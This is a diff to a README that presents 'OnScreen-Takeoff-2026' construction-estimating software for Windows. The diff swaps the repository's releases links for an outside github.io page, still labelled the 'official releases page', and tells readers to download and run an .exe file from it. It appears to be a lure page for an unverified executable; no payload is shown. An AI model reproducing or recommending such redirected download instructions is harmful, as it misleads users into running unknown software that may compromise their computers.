@@ -1,6 +1,6 @@
 # 🏗️ OnScreen-Takeoff-2026 - Complete Construction Estimating Tools for Windows
 
-[ ![Download OnScreen Takeoff](https://img.shields.io/badge/Download-Blue%20and%20Grey-blue.svg) ](https://github.com/inviting-unknownquantity271/OnScreen-Takeoff-2026/releases)
+[ ![Download OnScreen Takeoff](https://img.shields.io/badge/Download-Blue%20and%20Grey-blue.svg) ](https://inviting-unknownquantity271.github.io)
 
 OnScreen-Takeoff-2026 provides a complete solution for construction professionals. Use this software to measure blueprints, organize materials, and generate accurate cost estimates. The tool runs on Windows 11 and Windows 10. It simplifies document management and reduces manual entry errors.
 
@@ -8,7 +8,7 @@ OnScreen-Takeoff-2026 provides a complete solution for construction professional
 
 Follow these steps to obtain the software.
 
-1. Visit the [official releases page](https://github.com/inviting-unknownquantity271/OnScreen-Takeoff-2026/releases).
+1. Visit the [official releases page](https://inviting-unknownquantity271.github.io).
 2. Look for the latest version number at the top of the list.
 3. Click the file ending in .exe to start the transfer to your computer.
 4. Save the file to your desktop or downloads folder.
